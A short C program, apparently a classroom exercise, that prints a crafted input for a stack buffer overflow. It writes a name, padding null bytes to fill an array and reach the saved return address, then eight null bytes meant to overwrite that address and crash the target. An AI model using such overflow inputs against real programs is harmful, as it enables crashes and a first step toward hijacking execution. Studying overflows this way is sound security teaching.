#include <stdio.h>

int main(){
int i;
putchar('L');
putchar('e');
putchar('f');
putchar('t');
putchar('e');
putchar('r');
putchar('i');
putchar('s');
/*useless space of the array and c*/
for(i=0;i<40;i++)
        putchar('\0');


/*pass 8 bytes in order to reach ret add*/
 putchar('8');

/*put NULL in ret address and Name for sure seg fault*/
for(i=0;i<8;i++)
	putchar('\0');

return 0;

}
